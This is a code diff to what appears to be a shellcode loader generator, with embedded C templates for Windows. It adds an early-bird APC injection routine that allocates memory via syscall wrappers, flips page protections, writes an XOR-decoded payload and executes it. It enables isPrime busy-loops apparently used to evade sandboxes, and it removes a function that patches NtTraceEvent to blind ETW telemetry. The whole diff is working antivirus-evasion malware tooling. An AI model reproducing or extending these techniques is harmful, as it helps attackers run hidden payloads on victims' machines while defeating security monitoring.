@@ -10,9 +10,9 @@ var __c__sandbox = `
 	isPrime(1000000000000002217);
 	isPrime(1000000000000002137);
 	isPrime(1000000000000002097);
-	//isPrime(1000000000000002049);
-	//isPrime(1000000000000001953);
-	//isPrime(1000000000000002481);
+	isPrime(1000000000000002049);
+	isPrime(1000000000000001953);
+	isPrime(1000000000000002481);
 
 `
 
@@ -28,21 +28,20 @@ var __c__syscall_callback = `
 	EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);
 `
 var __c__syscall__earlyBird = `
-    LPVOID shellAddress = VirtualAlloc(NULL, allocationSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    DWORD oldProtect;
     myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
-    memcpy(shellAddress, xpp, allocationSize);
-    //WriteProcessMemory(GetCurrentProcess(), shellAddress, buf, allocationSize, NULL);
-
-
-    QueueUserAPC((PAPCFUNC)shellAddress, GetCurrentThread(), NULL);
-    testAlert();
-    //VAV_NtAllocateVirtualMemory(hProcess, &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    //VAV_NtWriteVirtualMemory(hProcess, addr, xpp, length, &bytesWritten);
-    ////LPVOID addr1 = VirtualAlloc(NULL, sizeof(xpp), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    ////RtlMoveMemory(addr1, xpp,length);
-    ////QueueUserAPC((PAPCFUNC)addr1, GetCurrentThread(), NULL);
-	//Sw3NtQueueApcThread(GetCurrentThread(),(PAPCFUNC)addr,NULL,NULL,NULL);
-    //Sw3NtTestAlert();
+ 	VAV_NtAllocateVirtualMemory(GetCurrentProcess(), &addr, 0, &allocationSize, MEM_COMMIT | MEM_RESERVE, 0x04);
+	isPrime(1000000000000002049);
+    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x20, &oldProtect);	
+	isPrime(1000000000000002049);
+    VAV_NtProtectVirtualMemory(GetCurrentProcess(),&addr, &allocationSize, 0x40, &oldProtect);	
+	isPrime(1000000000000002049);
+	VAV_NtWriteVirtualMemory(GetCurrentProcess(), addr, xpp, length, NULL);
+	//VAVNtQueueApcThread(GetCurrentThread(),(PAPCFUNC)addr,NULL,NULL,NULL);
+    QueueUserAPC((PAPCFUNC)addr, GetCurrentThread(), NULL);
+	//VAVNtTestAlert();
+    testAlert();	
+	
 `
 
 // 纤程加载
@@ -349,21 +348,10 @@ _Bool isPrime(long long n) {
     return 1;
 }
 
-DWORD PatchEtw()
-{
-DWORD dwOld = 0;
-FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibraryA("ntdll"), "NtTraceEvent");
-VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
-memcpy(ptrNtTraceEvent, "\xc3", 1);
-VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
-return 0;
-}
 
 int main()
 {
-
-	PatchEtw();
-    pNewLdrLoadDll LdrLoadrDll;
+ 	pNewLdrLoadDll LdrLoadrDll;
     UNICODE_STRING user32dll;
     UNICODE_STRING kernel32dll;
     UNICODE_STRING ntdlldll;
@@ -739,19 +727,9 @@ void My_Xor(char* data, size_t data_len, char* key, size_t key_len) {
         j++;
     }
 }
-DWORD PatchEtw()
-{
-DWORD dwOld = 0;
-FARPROC ptrNtTraceEvent = GetProcAddress(LoadLibraryA("ntdll"), "NtTraceEvent");
-VirtualProtect(ptrNtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &dwOld);
-memcpy(ptrNtTraceEvent, "\xc3", 1);
-VirtualProtect(ptrNtTraceEvent, 1, dwOld, &dwOld);
-return 0;
-}
 
 int main()
 {
-	PatchEtw();
     pNewLdrLoadDll LdrLoadrDll;
     UNICODE_STRING user32dll;
     UNICODE_STRING kernel32dll;
